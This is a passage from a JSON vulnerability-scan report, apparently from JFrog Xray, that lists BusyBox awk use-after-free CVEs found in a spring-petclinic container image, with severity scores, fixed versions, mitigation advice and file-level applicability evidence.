         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the clrvar function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42380",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the clrvar function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190230",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in `awk` leads to denial of service and possibly code execution when processing a crafted awk pattern in the `clrvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42380",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42380",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190229",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the hash_init function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42381",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the hash_init function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190229",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `hash_init` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42381",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42381",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190229",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the hash_init function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42381",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the hash_init function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190229",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `hash_init` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42381",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42381",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190228",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_s function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42382",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_s function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190228",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `getvar_s` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42382",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42382",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190228",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_s function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42382",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_s function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190228",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `getvar_s` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42382",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
